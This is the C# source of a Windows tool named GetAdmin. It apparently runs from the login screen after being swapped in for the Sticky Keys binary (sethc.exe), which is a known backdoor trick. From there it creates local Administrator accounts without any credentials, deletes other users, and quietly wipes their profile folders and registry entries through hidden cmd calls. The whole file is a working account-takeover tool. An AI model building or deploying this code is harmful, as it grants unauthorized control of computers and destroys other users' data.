using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;

namespace GetAdmin
{
    public partial class Form1 : Form
    {
        public static string UserName;
        public static string Pass;

        static Mutex mutex = new Mutex(true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}");

        private bool IsRunAsAdministrator()
        {
            var wi = WindowsIdentity.GetCurrent();
            var wp = new WindowsPrincipal(wi);

            return wp.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public Form1()
        {
            InitializeComponent();
            if (!IsRunAsAdministrator())
            {
                MessageBox.Show("This program needs administrator to run, please logout and then active sticky key(shift 5 times)", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Environment.Exit(0);
            }
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                MessageBox.Show("You can only start one instance at a time", "GetAdmin.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            {
                mutex.ReleaseMutex();
            }

            refresh();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Delete();
            this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //GetAdmin
            string msg = createUser(textBox1.Text, textBox2.Text);
            if (msg != null)
            {
                MessageBox.Show(msg);
                return;
            }

            MessageBox.Show("Admin Account Created Successfully");
            refresh();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.Close();
            Delete();
        }

        private void RemoveBtn_Click(object sender, EventArgs e)
        {
            if (comboBox1.SelectedItem == null)
            {
                MessageBox.Show("You didn't select anything, please select something", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            DialogResult answer = MessageBox.Show("You sure you want to delete that user?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (answer == DialogResult.Yes)
            {
                string selectedItem = comboBox1.SelectedItem.ToString();
                string SID = ((ComboboxItem)comboBox1.SelectedItem).Value.ToString();
                var message = removeUser(selectedItem);
                if (message != null)
                {
                    MessageBox.Show(message);
                }
                else
                {
                    MessageBox.Show("Successfully removed the user");

                    DialogResult deleteFiles = MessageBox.Show("Do you want to delete the files and registries in that user profile too?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                    if (deleteFiles == DialogResult.Yes)
                    {
                        removeFiles(selectedItem, SID);
                        MessageBox.Show("Successfully removed the user profile");
                    }
                }
                refresh();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("cmd.exe");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("regedit.exe");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("taskmgr.exe");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("netplwiz.exe");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            try
            {
                Process.Start("explorer.exe", @"C:\");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"There is an error while starting the app. Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            refresh();
        }

        private void Delete()
        {
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"" + " & rename \"sethc.old.exe\" \"sethc.exe\"",
                    WorkingDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetName().CodeBase),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch (Exception e)
            {
                MessageBox.Show("There is an error, Sticky key won't work unless contact the creator for a fix(You could manually fix it: go to System32 then delete sethc.exe, rename sethc.old.exe to sethc.exe): " + e);
            }
        }

        private void refresh()
        {
            comboBox1.Items.Clear();

            ManagementObjectSearcher usersSearcher = new ManagementObjectSearcher(@"SELECT * FROM Win32_UserAccount");
            ManagementObjectCollection users = usersSearcher.Get();
            var localUsers = users.Cast<ManagementObject>().Where(u => (bool)u["LocalAccount"] == true && (bool)u["Disabled"] == false && (bool)u["Lockout"] == false && int.Parse(u["SIDType"].ToString()) == 1 && u["Name"].ToString() != "HomeGroupUser$");

            foreach (ManagementObject user in localUsers)
            {
                ComboboxItem item = new ComboboxItem();
                item.Text = user["Name"].ToString();
                item.Value = user["SID"].ToString();
                comboBox1.Items.Add(item);
            }
        }

        public static string createUser(string UserName, string Pass)
        {
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(UserName, "user");
                NewUser.Invoke("SetPassword", new object[] { Pass });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
            }
            catch (Exception ex)
            {
                return "There is an error while creating the account: " + ex.Message;
            }
            return null;
        }

        private string removeUser(string removeUser)
        {
            try
            {
                DirectoryEntry localDirectory = new DirectoryEntry("WinNT://" + Environment.MachineName.ToString());
                DirectoryEntries users = localDirectory.Children;
                DirectoryEntry user = users.Find(removeUser);
                users.Remove(user);
            }
            catch (Exception ex)
            {
                return "There is an error while removing the account. Error: " + ex.Message;
            }
            return null;
        }

        private void removeFiles(string userName, string SID)
        {
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = $"/C rd /s /q \"{Path.GetPathRoot(Environment.SystemDirectory)}Users\\{userName}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch { }
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = $"/C reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{SID}\" /f",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch { }
        }
    }

    public class ComboboxItem
    {
        public string Text { get; set; }
        public object Value { get; set; }

        public override string ToString()
        {
            return Text;
        }
    }
}
